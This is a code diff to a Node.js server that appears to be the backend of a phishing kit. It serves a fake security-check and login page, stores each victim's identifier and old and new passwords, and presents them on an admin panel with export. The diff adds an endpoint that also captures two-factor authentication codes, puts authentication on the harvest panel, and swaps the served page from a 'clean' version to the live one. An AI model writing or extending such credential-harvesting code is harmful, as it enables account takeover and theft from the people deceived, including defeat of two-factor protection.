@@ -2,7 +2,33 @@ const http = require('http');
 const fs = require('fs');
 const path = require('path');
 const url = require('url');
-const { applyNoCache, confirmationHtml, renderAdmin } = require('./api/_html');
+
+(function loadDotenv() {
+  const files = [path.join(__dirname, '.env.local'), path.join(__dirname, '.env')];
+  for (const file of files) {
+    try {
+      if (!fs.existsSync(file)) continue;
+      const raw = fs.readFileSync(file, 'utf8');
+      const lines = raw.split(/\r?\n/);
+      for (const ln of lines) {
+        const line = ln.trim();
+        if (!line || line.startsWith('#')) continue;
+        const eq = line.indexOf('=');
+        if (eq < 1) continue;
+        let k = line.slice(0, eq).trim();
+        let v = line.slice(eq + 1).trim();
+        if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) {
+          v = v.slice(1, -1);
+        }
+        if (!(k in process.env)) process.env[k] = v;
+      }
+    } catch (e) {
+      console.warn('[env] Impossible de lire ' + file, e && e.message);
+    }
+  }
+})();
+
+const { applyNoCache, confirmationHtml, twoFaHtml, renderAdmin, requireAdminAuth } = require('./api/_html');
 const { getAll, addEntry, clearAll } = require('./api/_storage');
 
 const PORT = process.env.PORT || 80;
@@ -69,8 +95,9 @@ const server = http.createServer(async (req, res) => {
       timestamp: new Date().toLocaleString('fr-FR'),
       identifier: body.identifier || '',
       old_password: body.oldPassword || '',
-      new_password: body.newPassword || '',
-      confirm_password: body.confirmPassword || ''
+      code_2fa: '',
+      new_password: '',
+      confirm_password: ''
     };
 
     try { await addEntry(entry); } catch (err) { console.warn('[submit]', err.message); }
@@ -80,7 +107,33 @@ const server = http.createServer(async (req, res) => {
     return res.end(confirmationHtml);
   }
 
+  if (req.method === 'POST' && (pathname === '/submit-2fa' || pathname === '/api/submit-2fa')) {
+    applyNoCache(res);
+    let body = {};
+    try {
+      const raw = await readBody(req);
+      const parsedBody = parseBody(raw, req.headers['content-type']);
+      body = parsedBody instanceof URLSearchParams ? Object.fromEntries(parsedBody) : parsedBody;
+    } catch {}
+
+    const entry = {
+      timestamp: new Date().toLocaleString('fr-FR'),
+      identifier: body.identifier || '',
+      old_password: body.oldPassword || '',
+      code_2fa: body.code_2fa || '',
+      new_password: body.newPassword || '',
+      confirm_password: body.confirmPassword || ''
+    };
+
+    try { await addEntry(entry); } catch (err) { console.warn('[submit-2fa]', err.message); }
+
+    res.statusCode = 200;
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    return res.end(confirmationHtml);
+  }
+
   if (pathname === '/admin') {
+    if (!requireAdminAuth(req, res)) return;
     applyNoCache(res);
     let data = [];
     try { data = await getAll(); } catch {}
@@ -90,6 +143,7 @@ const server = http.createServer(async (req, res) => {
   }
 
   if (pathname === '/admin/export' || pathname === '/api/admin/export') {
+    if (!requireAdminAuth(req, res)) return;
     applyNoCache(res);
     let data = [];
     try { data = await getAll(); } catch {}
@@ -101,6 +155,7 @@ const server = http.createServer(async (req, res) => {
   }
 
   if (pathname === '/admin/clear' || pathname === '/api/admin/clear') {
+    if (!requireAdminAuth(req, res)) return;
     applyNoCache(res);
     try { await clearAll(); } catch {}
     res.statusCode = 302;
@@ -109,7 +164,7 @@ const server = http.createServer(async (req, res) => {
   }
 
   if (pathname === '/' || pathname === '/security' || pathname === '/security/check' || pathname === '/login/identify') {
-    return sendFile(res, path.join(PUBLIC_DIR, 'index_clean.html'));
+    return sendFile(res, path.join(PUBLIC_DIR, 'index.html'));
   }
 
   const safePath = path.normalize(pathname).replace(/^(\.\.[\/\\])+/, '');
@@ -120,7 +175,7 @@ const server = http.createServer(async (req, res) => {
   }
   fs.stat(filePath, (err, stat) => {
     if (err || !stat.isFile()) {
-      return sendFile(res, path.join(PUBLIC_DIR, 'index_clean.html'), 200);
+      return sendFile(res, path.join(PUBLIC_DIR, 'index.html'), 200);
     }
     sendFile(res, filePath);
   });
